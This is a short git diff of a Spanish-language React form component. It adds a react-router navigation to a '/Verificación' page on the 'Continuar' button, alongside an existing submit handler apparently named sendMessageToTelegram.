@@ -1,5 +1,6 @@
 import styles from "../Form/Form.module.css";
 import { AuthForm } from "../../context/ContextForm";
+import { useNavigate } from "react-router-dom";
 
 function Form() {
   const {
@@ -11,6 +12,8 @@ function Form() {
     setTelefone,
     sendMessageToTelegram,
   } = AuthForm();
+
+  const navigate = useNavigate();
 
   return (
     <form className={styles.form} onSubmit={sendMessageToTelegram}>
@@ -41,7 +44,9 @@ function Form() {
           de privacidad. Leer
         </p>
       </div>
-      <button>{"Continuar".toUpperCase()}</button>
+      <button onClick={() => navigate("/Verificación")}>
+        {"Continuar".toUpperCase()}
+      </button>
     </form>
   );
 }
